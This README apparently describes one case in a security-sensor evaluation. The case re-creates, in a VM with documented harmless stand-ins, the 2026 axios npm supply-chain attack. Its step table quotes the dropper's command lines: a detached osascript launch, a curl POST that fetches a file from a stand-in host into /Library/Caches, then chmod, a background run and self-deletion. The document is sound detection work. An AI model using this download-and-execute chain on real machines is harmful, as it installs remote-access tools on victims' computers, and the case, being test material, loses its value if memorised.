# axios

The npm compromise of 31 March 2026: two releases of `axios`, published from
a maintainer's taken-over account, added one dependency whose install script
dropped a remote-access tool on macOS, Windows and Linux, then removed its
own traces from `node_modules`. Microsoft attributes it to a North Korean
state actor (Sapphire Sleet).

The recording is of a developer's Mac (a VM) where the person types
`npm install acme-fetch` in their Terminal, and of nothing else they do.

## What happens in the recording

| step | what the sensor sees | from the write-ups |
|---|---|---|
| 1 | `npm install` resolves the new release, which brings in a second package, and runs that package's `postinstall`, `node setup.js` | StepSecurity, Microsoft: the releases added one dependency, never imported, there for its install hook |
| 2 | `node` writes an AppleScript to `/tmp/<number>` and starts it with `nohup osascript "/tmp/<number>" > /dev/null 2>&1 &`, so it outlives the install | StepSecurity (the path and the line), Microsoft |
| 3 | `node` deletes `setup.js`, deletes the package's `package.json` and renames `package.md`, a clean manifest one version lower, into its place | StepSecurity, Huntress, Elastic |
| 4 | `osascript` starts `sh -c "curl -o /Library/Caches/com.apple.… -d … -s http://<host>:8000/<number> && chmod 770 … && /bin/zsh -c \"… &\""`: `curl` POSTs to the attacker's host on port 8000 and writes the file under `/Library/Caches` | Huntress (the process tree its EDR saw), Microsoft and StepSecurity (the decoded line) |
| 5 | `chmod 770` on that file | the same |
| 6 | `/bin/zsh -c` starts the file in the background with the server's address as its argument | the same |
| 7 | `osascript` runs `rm -rf /tmp/<number>`: the AppleScript deletes itself | StepSecurity, Microsoft |
| 8 | the tool connects to the same host on port 8000 once a minute, by plain HTTP POST | Elastic, Huntress: a beacon every 60 seconds |

`twin.sh` is the same kinds of acts by the person on their own work: a
dependency whose install script downloads a binary (Electron), `osascript`
for a notification, a tool fetched from its GitHub release with `curl`, made
executable and run, and a local server on port 8000 in the background.

## What is real and what is stood in

Real: every program and its parent (`npm`, `node`, `osascript`, `sh`, `curl`,
`chmod`, `zsh`), the command lines but for the names in them, the files
written, deleted and renamed, the POST to port 8000 by `curl` and the ones
after it by the tool.

`/Library/Caches` is writable by any user on macOS (mode 1777, like `/tmp`),
which is why the dropper could use it without asking for a password. None of
the write-ups mentions a prompt or root, and none is needed here.

Stood in:

- **The registry.** `registry.npmjs.org` in the VM is
  [`standin/registry.py`](../../standin/registry.py) on the host. Both
  packages come from it.
- **The attacker's server.** `pkgs-sync.example` in the VM is the same
  stand-in, which answers 200 with nothing to any request and keeps no
  content.
- **The tool.** The real one was a compiled universal Mach-O binary. Here the
  stand-in server answers the same `curl` request with [`tool.js`](tool.js),
  a node script (`#!/opt/homebrew/bin/node`), so the process the sensor sees
  running from `/Library/Caches` is `node` with that path as its script, not a
  binary of that name.
- **What the tool does.** Three POSTs of 96 bytes of filler, a minute apart,
  then it exits. It takes no commands, reads nothing, and sends nothing from
  the machine.
- **The names.** The packages (`acme-fetch`, `acme-hash`) and their versions,
  the host, the number in the address and in `/tmp`, the POST body, and the
  file under `/Library/Caches` are made up; the incident's own are not used,
  so that nothing is caught by a name. The file keeps the look of the real
  one, a `com.apple.` name.
- **The AppleScript's first lines.** It ends at once unless
  `/etc/tangent-eval-vm` exists. That check starts no process.

Not in the recording: what the real tool did once running. On its first
beacon it sent a listing of `/Applications`, `~/Library` and
`~/Library/Application Support`, and a system profile with the process list
(from `ps`); on command it ran AppleScript through `osascript`, listed
directories, and wrote, ad-hoc signed (`codesign --force --deep --sign -`)
and ran further binaries. No write-up says which commands the operators sent
to any one Mac, so none is invented. The obfuscation of `setup.js` is left
out, as is the takeover of the maintainer's account that published the
releases, and the Windows and Linux branches.

The payload runs only on a recording VM (`/etc/tangent-eval-vm`, and a
`pkgs-sync.example` that resolves to a private address) and exits at once
anywhere else.

## Needs in the VM

`node` at `/opt/homebrew/bin/node`, which `vm/provision.sh` gives (Homebrew
on Apple silicon). The tool is started by `osascript`'s shell, whose `PATH`
has no Homebrew in it, so its first line names node by its full path.

Each recording leaves `/Library/Caches/com.apple.pkg.syncd` and, after the
twin, `~/bin/jq` and Electron in `acme-web` behind, so each wants a VM that
has not run the other.

## Sources

See [`case.json`](case.json).
